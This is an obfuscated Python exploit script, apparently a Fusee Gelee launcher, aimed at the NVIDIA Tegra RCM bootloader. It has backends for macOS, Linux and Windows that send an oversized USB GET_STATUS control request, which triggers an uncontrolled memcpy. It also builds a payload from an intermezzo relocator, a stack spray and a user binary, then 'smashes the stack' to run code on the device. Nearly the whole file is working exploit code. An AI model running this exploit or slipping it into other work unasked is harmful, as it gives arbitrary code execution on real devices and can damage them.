k='platform'
j='Windows'
i='Linux'
h=classmethod
Y='store_true'
X=str
W=open
V=ValueError
R=b'\x00'
M=IOError
K='little'
H=False
G=len
F=int
C=print
B=None
import os as I,sys as N,errno,ctypes as A,argparse as l,platform as m
Z=1073807360
a=1073811008
b=1073827392
n=1073836032
class P:
	STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT=130;STANDARD_REQUEST_DEVICE_TO_HOST=128;GET_DESCRIPTOR=6;GET_CONFIGURATION=8;GET_STATUS=0;SUPPORTED_SYSTEMS=[]
	def __init__(A,skip_checks=H):A.skip_checks=skip_checks
	def print_warnings(A):0
	def trigger_vulnerability(A,length):raise NotImplementedError('Trying to use an abstract backend rather than an instance of the proper subclass!')
	@h
	def supported(cls,system_override=B):
		A=system_override
		if A:B=A
		else:B=m.system()
		return B in cls.SUPPORTED_SYSTEMS
	@h
	def create_appropriate_backend(cls,system_override=B,skip_checks=H):
		for A in cls.__subclasses__():
			if A.supported(system_override):return A(skip_checks=skip_checks)
		raise M("No backend to trigger the vulnerability-- it's likely we don't support your OS!")
	def read(A,length):return bytes(A.dev.read(129,length,1000))
	def write_single_buffer(A,data):return A.dev.write(1,data,1000)
	def find_device(A,vid=B,pid=B):import usb;A.dev=usb.core.find(idVendor=vid,idProduct=pid);return A.dev
class t(P):
	BACKEND_NAME='macOS';SUPPORTED_SYSTEMS=['Darwin','libusbhax','macos','FreeBSD']
	def trigger_vulnerability(A,length):return A.dev.ctrl_transfer(A.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT,A.GET_STATUS,0,0,length)
class u(P):
	BACKEND_NAME=i;SUPPORTED_SYSTEMS=[i,'linux'];SUPPORTED_USB_CONTROLLERS=['pci/drivers/xhci_hcd','platform/drivers/dwc_otg'];SETUP_PACKET_SIZE=8;IOCTL_IOR=2147483648;IOCTL_TYPE=ord('U');IOCTL_NR_SUBMIT_URB=10;URB_CONTROL_REQUEST=2
	class SubmitURBIoctl(A.Structure):_fields_=[('type',A.c_ubyte),('endpoint',A.c_ubyte),('status',A.c_int),('flags',A.c_uint),('buffer',A.c_void_p),('buffer_length',A.c_int),('actual_length',A.c_int),('start_frame',A.c_int),('stream_id',A.c_uint),('error_count',A.c_int),('signr',A.c_uint),('usercontext',A.c_void_p)]
	def print_warnings(A):C('\nImportant note: on desktop Linux systems, we currently require an XHCI host controller.');C("A good way to ensure you're likely using an XHCI backend is to plug your");C("device into a blue 'USB 3' port.\n")
	def trigger_vulnerability(B,length):D=length;import os,fcntl;B._validate_environment();E=os.open('/dev/bus/usb/{:0>3d}/{:0>3d}'.format(B.dev.bus,B.dev.address),os.O_RDWR);H=F.to_bytes(B.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT,1,byteorder=K)+F.to_bytes(B.GET_STATUS,1,byteorder=K)+F.to_bytes(0,2,byteorder=K)+F.to_bytes(0,2,byteorder=K)+F.to_bytes(D,2,byteorder=K);G=B.SETUP_PACKET_SIZE+D;I=A.create_string_buffer(H,G);C=B.SubmitURBIoctl();C.type=B.URB_CONTROL_REQUEST;C.endpoint=0;C.buffer=A.addressof(I);C.buffer_length=G;J=B.IOCTL_IOR|A.sizeof(C)<<16|ord('U')<<8|B.IOCTL_NR_SUBMIT_URB;fcntl.ioctl(E,J,C,True);os.close(E);raise M('Raising an error to match the others!')
	def _validate_environment(A):
		from glob import glob
		if A.skip_checks:C('skipping checks');return
		for B in A.SUPPORTED_USB_CONTROLLERS:
			for D in glob('/sys/bus/{}/*/usb*'.format(B)):
				if A._node_matches_our_device(D):return
		raise V('This device needs to be on a supported backend. Usually that means plugged into a blue/USB 3.0 port!\nBailing out.')
	def _node_matches_our_device(A,path):
		B='/busnum'
		if not I.path.isfile(path+B):return H
		if A.dev.bus!=A._read_num_file(path+B):return H
		return True
	def _read_num_file(C,path):
		with W(path,'r')as A:B=A.read();return F(B)
class v(P):
	BACKEND_NAME=j;SUPPORTED_SYSTEMS=[j];WINDOWS_FILE_DEVICE_UNKNOWN=34;LIBUSBK_FUNCTION_CODE_GET_STATUS=2055;WINDOWS_METHOD_BUFFERED=0;WINDOWS_FILE_ANY_ACCESS=0;RAW_REQUEST_STRUCT_SIZE=24;TO_ENDPOINT=2
	def win_ctrl_code(A,DeviceType,Function,Method,Access):return DeviceType<<16|Access<<14|Function<<2|Method
	def __init__(B,skip_checks):import libusbK as C;B.libk=C;B.lib=A.cdll.libusbK
	def find_device(C,Vid,Pid):
		F=C.libk.KLST_HANDLE();E=A.pointer(C.libk.KLST_DEV_INFO());D=C.lib.LstK_Init(A.byref(F),0)
		if D==0:raise A.WinError()
		E=A.pointer(C.libk.KLST_DEV_INFO());D=C.lib.LstK_FindByVidPid(F,Vid,Pid,A.byref(E));C.lib.LstK_Free(A.byref(F))
		if E is B or D==0:return
		C.dev=C.libk.KUSB_DRIVER_API();D=C.lib.LibK_LoadDriverAPI(A.byref(C.dev),E.contents.DriverID)
		if D==0:raise A.WinError()
		C.handle=C.libk.KUSB_HANDLE(B);D=C.dev.Init(A.byref(C.handle),E)
		if D==0:raise C.libk.WinError()
		return C.dev
	def read(C,length):
		D=length;E=A.create_string_buffer(D);F=A.c_uint(0);G=C.dev.ReadPipe(C.handle,A.c_ubyte(129),A.addressof(E),A.c_uint(D),A.byref(F),B)
		if G==0:raise A.WinError()
		return E.raw
	def write_single_buffer(C,data):
		D=bytearray(data);E=(A.c_ubyte*G(D))(*D);F=A.c_uint(0);H=C.dev.WritePipe(C.handle,A.c_ubyte(1),E,G(data),A.byref(F),B)
		if H==0:raise A.WinError()
	def ioctl(D,driver_handle,ioctl_code,input_bytes,input_bytes_count,output_bytes,output_bytes_count):
		C=D.libk.OVERLAPPED();A.memset(A.addressof(C),0,A.sizeof(C));E=A.windll.kernel32.DeviceIoControl(driver_handle,ioctl_code,input_bytes,input_bytes_count,output_bytes,output_bytes_count,B,A.byref(C))
		if E==H:raise A.WinError()
	def trigger_vulnerability(C,length):
		F=length;I=A.cast(C.handle,A.POINTER(C.libk.KUSB_HANDLE_INTERNAL));D=I.contents.Device.contents.MasterDeviceHandle
		if D is B or D==C.libk.INVALID_HANDLE_VALUE:raise V('Failed to initialize master handle')
		E=A.create_string_buffer(C.RAW_REQUEST_STRUCT_SIZE);J=A.cast(E,A.POINTER(A.c_uint));J.contents=A.c_ulong(1000);G=A.cast(A.byref(E,4),A.POINTER(C.libk.status_t));G.contents.index=C.GET_STATUS;G.contents.recipient=C.TO_ENDPOINT;K=A.create_string_buffer(F);L=C.win_ctrl_code(C.WINDOWS_FILE_DEVICE_UNKNOWN,C.LIBUSBK_FUNCTION_CODE_GET_STATUS,C.WINDOWS_METHOD_BUFFERED,C.WINDOWS_FILE_ANY_ACCESS);M=C.ioctl(D,A.c_ulong(L),E,A.c_size_t(24),K,A.c_size_t(F))
		if M==H:raise A.WinError()
class o:
	DEFAULT_VID=2389;DEFAULT_PID=29473;COPY_BUFFER_ADDRESSES=[1073762304,1073778688];STACK_END=1073807360
	def __init__(A,wait_for_device=H,os_override=B,vid=B,pid=B,override_checks=H):
		A.current_buffer=0;A.total_written=0
		try:A.backend=P.create_appropriate_backend(system_override=os_override,skip_checks=override_checks)
		except M:C("It doesn't look like we support your OS, currently. Sorry about that!\n");N.exit(-1)
		A.dev=A._find_device(vid,pid)
		if A.dev is B:
			if wait_for_device:
				C('Waiting for a TegraRCM device to come online...')
				while A.dev is B:A.dev=A._find_device(vid,pid)
			else:raise M('No TegraRCM device found?')
		A.backend.print_warnings();C('Identified a {} system; setting up the appropriate backend.'.format(A.backend.BACKEND_NAME))
	def _find_device(C,vid=B,pid=B):B=pid;A=vid;A=A if A else C.DEFAULT_VID;B=B if B else C.DEFAULT_PID;return C.backend.find_device(A,B)
	def read(A,length):return A.backend.read(length)
	def write(D,data):
		A=data;B=G(A);E=4096
		while B:C=min(B,E);B-=C;F=A[:C];A=A[C:];D.write_single_buffer(F)
	def write_single_buffer(A,data):A._toggle_buffer();return A.backend.write_single_buffer(data)
	def _toggle_buffer(A):A.current_buffer=1-A.current_buffer
	def get_current_buffer_address(A):return A.COPY_BUFFER_ADDRESSES[A.current_buffer]
	def read_device_id(A):return A.read(16)
	def switch_to_highbuf(A):
		if A.get_current_buffer_address()!=A.COPY_BUFFER_ADDRESSES[1]:A.write(R*4096)
	def trigger_controlled_memcpy(A,length=B):
		C=length
		if C is B:C=A.STACK_END-A.get_current_buffer_address()
		return A.backend.trigger_vulnerability(C)
def c(id):return F(id,16)
E=l.ArgumentParser(description='Fusee launch for pico')
E.add_argument('-w',dest='wait',action=Y,help="wait for RCM")
E.add_argument('-V',metavar='vendor_id',dest='vid',type=c,default=B,help='override Tegra vendor id')
E.add_argument('-P',metavar='product_id',dest='pid',type=c,default=B,help='override Tegra prod ID')
E.add_argument('--override-os',metavar=k,dest=k,type=X,default=B,help='override host OS')
E.add_argument('--relocator',metavar='binary',dest='relocator',type=X,default='%s/intermezzo.bin'%I.path.dirname(I.path.abspath(__file__)),help='intermezzo stub loc')
E.add_argument('--override-checks',dest='skip_checks',action=Y,help="don't check for controller;")
E.add_argument('--allow-failed-id',dest='permissive_id',action=Y,help="continue even if reading the device's ID fails;")
J=E.parse_args()
d=I.path.expanduser('payload.bin')
if not I.path.isfile(d):C('Invalid payload path specified!');N.exit(-1)
e=I.path.expanduser(J.relocator)
if not I.path.isfile(e):C('Could not find the intermezzo interposer. Did you build it?');N.exit(-1)
try:Q=o(wait_for_device=J.wait,vid=J.vid,pid=J.pid,os_override=J.platform,override_checks=J.skip_checks)
except M as O:C(O);N.exit(-1)
try:p=Q.read_device_id();C('Found a Tegra with Device ID: {}'.format(p))
except OSError as O:
	if not J.permissive_id:raise O
S=197272
D=S.to_bytes(4,byteorder=K)
D+=R*(680-G(D))
C('\nSetting ourselves up to smash the stack...')
f=0
with W(e,'rb')as T:g=T.read();f=G(g);D+=g
L=a-(Z+f)
D+=R*L
U=b''
with W(d,'rb')as T:U=T.read()
L=b-a
D+=U[:L]
q=F((n-b)/4)
D+=Z.to_bytes(4,byteorder=K)*q
D+=U[L:]
r=G(D)
L=4096-r%4096
D+=R*L
if G(D)>S:s=G(D)-S;C('ERROR: Payload is too large to be submitted via RCM. ({} bytes larger than max).'.format(s));N.exit(errno.EFBIG)
C('Uploading payload...')
Q.write(D)
Q.switch_to_highbuf()
C('Smashing the stack...')
try:Q.trigger_controlled_memcpy()
except V as O:C(X(O))
except M:C("The USB device stopped responding-- sure smells like we've smashed its stack. :)");C('Launch complete!')